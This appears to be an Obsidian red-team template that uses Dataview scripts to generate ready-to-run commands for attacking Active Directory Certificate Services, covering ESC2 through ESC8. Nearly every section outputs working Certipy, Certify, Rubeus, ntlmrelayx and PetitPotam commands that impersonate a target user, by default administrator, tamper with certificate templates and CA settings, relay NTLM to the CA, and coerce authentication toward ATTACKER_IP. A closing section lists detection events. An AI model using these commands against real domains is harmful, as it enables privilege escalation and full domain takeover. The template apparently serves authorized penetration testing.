---
# Attack-specific fields
ca_server:
ca_name:
template_name:
esc_type: ESC2
target_user:
cert_b64:
tgt_ticket:
notes:
---

# ADCS — ESC2 through ESC8

> [!abstract] Attack Summary
> Beyond ESC1, ADCS has multiple additional misconfigurations (ESC2–ESC8) that enable privilege escalation, persistence, and lateral movement. Each ESC (Escalation) type targets a different misconfiguration: template permissions, SubCA misconfiguration, request agent abuse, vulnerable ACLs on CA objects, or NTLM relay.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["DC FQDN",  b?.dc_fqdn  ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const escTypes = ["ESC2","ESC3","ESC4","ESC5","ESC6","ESC7","ESC8"];
const escOptions = escTypes.map(e => `option(${e})`).join(',');

dv.table(["Field", "Value"], [
  ["ESC Type",           `\`INPUT[inlineSelect(defaultValue(${p.esc_type ?? 'ESC2'}),${escOptions}):esc_type]\``],
  ["CA Server FQDN",     `\`INPUT[text:ca_server]\``],
  ["CA Name",            `\`INPUT[text:ca_name]\``],
  ["Template Name",      `\`INPUT[text:template_name]\``],
  ["Target User",        `\`INPUT[text:target_user]\``],
]);
```

---

## Step 1 — Find All Vulnerable ADCS Configurations

**Linux — Certipy**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain ?? "DOMAIN";
const dc_ip    = b?.dc_ip  ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\n# Find all ESC vulnerabilities\ncertipy find -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -vulnerable -stdout\n\n# Save to JSON for BloodHound\ncertipy find -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -bloodhound\n```");
```

**Windows — Certify**
```dataviewjs
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe find /vulnerable\nexecute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe find /all\n```");
```

CA Server: `INPUT[text:ca_server]` | CA Name: `INPUT[text:ca_name]`

---

## ESC2 — Any Purpose / SubCA Template

> [!info] Template has **Any Purpose** EKU or **no EKU** (SubCA), allowing the certificate to be used as a CA to sign other certificates.

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const template = p?.template_name || "ESC2_TEMPLATE";
const ca       = p?.ca_name || "CA_NAME";
const target   = p?.target_user || "administrator";
dv.paragraph("```bash\n# ESC2: Request cert (any purpose allows signing other certs)\ncertipy req -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -ca '" + ca + "' -template '" + template + "'\n\n# Use the ESC2 cert to request another cert as a different user\ncertipy req -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -ca '" + ca + "' -template User -on-behalf-of '" + domain.split('.')[0] + "\\\\" + target + "' -pfx esc2_cert.pfx\n\n# Then authenticate\ncertipy auth -pfx " + target + ".pfx -domain " + domain + " -dc-ip " + dc_ip + "\n```");
```

---

## ESC3 — Certificate Request Agent Abuse

> [!info] Template allows **Certificate Request Agent** (enrollment agent) rights, enabling requesting certificates on behalf of other users from templates with the **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME** flag.

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const ca       = p?.ca_name || "CA_NAME";
const target   = p?.target_user || "administrator";
dv.paragraph("```bash\n# Step 1: Get enrollment agent cert (from ESC3 template)\ncertipy req -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -ca '" + ca + "' -template 'ESC3-CertRequest'\n\n# Step 2: Use agent cert to request on behalf of target user\ncertipy req -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -ca '" + ca + "' -template 'User' -on-behalf-of '" + domain.split('.')[0] + "\\\\" + target + "' -pfx enrollment_agent.pfx\n\n# Step 3: Authenticate\ncertipy auth -pfx " + target + ".pfx -domain " + domain + " -dc-ip " + dc_ip + "\n```");
```

---

## ESC4 — Vulnerable Certificate Template ACL

> [!info] Low-privileged user has **write access** to a certificate template (WriteProperty, WriteDacl, WriteOwner, GenericWrite). You can modify the template to be ESC1-vulnerable and then exploit it.

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const ca       = p?.ca_name || "CA_NAME";
const template = p?.template_name || "VulnerableTemplate";
const target   = p?.target_user || "administrator";
dv.paragraph("```bash\n# Modify template to be ESC1-vulnerable\ncertipy template -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -template '" + template + "' -save-old\n\n# Now exploit as ESC1\ncertipy req -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -ca '" + ca + "' -template '" + template + "' -upn '" + target + "@" + domain + "'\n\n# Restore the template afterward\ncertipy template -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -template '" + template + "' -configuration SAVED_CONFIG\n```");
```

---

## ESC5 — Vulnerable PKI Object ACLs

> [!info] Low-privileged user has write access to **CA object** or **NTAuthCertificates** container in AD — allows adding rogue CAs or modifying CA behavior.

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\n# Check ACLs on CA configuration objects\ncertipy find -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -vulnerable -stdout | grep -A5 'ESC5'\n\n# If WriteProperty on NTAuthCertificates, can add rogue CA cert\n# Then forge certificates that are trusted domain-wide\n```");
```

---

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag

> [!info] The CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` set, allowing any template (even those without ENROLLEE_SUPPLIES_SUBJECT) to accept a SAN in the request.

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const ca       = p?.ca_name || "CA_NAME";
const target   = p?.target_user || "administrator";
dv.paragraph("```bash\n# Check if EDITF_ATTRIBUTESUBJECTALTNAME2 is set\ncertutil -config '" + (p?.ca_server || "CA_SERVER") + "\\\\" + ca + "' -getreg policy\\EditFlags\n\n# Exploit: request any enrollable template with SAN override\ncertipy req -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -ca '" + ca + "' -template User -upn '" + target + "@" + domain + "'\n\n# Certipy will automatically detect ESC6\ncertipy find -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -vulnerable\n```");
```

---

## ESC7 — Vulnerable CA Permissions

> [!info] Low-privileged user has **ManageCA** or **ManageCertificates** rights on the CA itself, allowing template modifications or certificate approval bypass.

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const ca       = p?.ca_name || "CA_NAME";
const target   = p?.target_user || "administrator";
dv.paragraph("```bash\n# Step 1: Enable EDITF_ATTRIBUTESUBJECTALTNAME2 on CA (with ManageCA)\ncertipy ca -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -ca '" + ca + "' -enable-template SubCA\n\n# Step 2: Request SubCA cert (will be denied)\ncertipy req -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -ca '" + ca + "' -template SubCA -upn '" + target + "@" + domain + "'\n\n# Step 3: Approve the request using ManageCertificates rights\ncertipy ca -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -ca '" + ca + "' -issue-request REQUEST_ID\n\n# Step 4: Retrieve the issued certificate\ncertipy req -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -ca '" + ca + "' -retrieve REQUEST_ID\n\n# Step 5: Authenticate\ncertipy auth -pfx " + target + ".pfx -domain " + domain + " -dc-ip " + dc_ip + "\n```");
```

---

## ESC8 — NTLM Relay to HTTP Enrollment Endpoint

> [!info] This is covered in detail in [[12 - ADCS NTLM Relay]]. Summary: relay NTLM auth to the CA's `/certsrv` HTTP endpoint to request a cert on behalf of the victim.

```dataviewjs
dv.paragraph("```bash\n# See template: 12 - ADCS NTLM Relay.md\n# Key commands:\nimpacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp --adcs --template DomainController -smb2support\n\n# Coerce authentication\npython3 PetitPotam.py ATTACKER_IP TARGET_IP\n```");
```

---

## Final — Authenticate with Certificate

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain  = b?.domain ?? "DOMAIN";
const dc_ip   = b?.dc_ip  ?? "DC_IP";
const target  = p?.target_user || "administrator";
dv.paragraph("```bash\n# Linux: certipy auth\ncertipy auth -pfx " + target + ".pfx -domain " + domain + " -dc-ip " + dc_ip + "\n\n# Windows: Rubeus\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgt /user:" + target + " /certificate:BASE64_CERT /password:CERT_PASS /domain:" + domain + " /nowrap\n```");
```

TGT ticket: `INPUT[text:tgt_ticket]`

---

## OPSEC

> [!warning] Detection Indicators
> - All ESC exploits generate **Event 4886** (cert requested) and **Event 4887** (cert issued) on the CA.
> - Template modifications (ESC4) generate **Event 5136** on the DC.
> - Certipy runs extensive LDAP queries — generates LDAP traffic to DC.
> - Monitor for abnormal CA issuance patterns, especially for high-privilege accounts.

---

## Notes & Results

`INPUT[textarea:notes]`
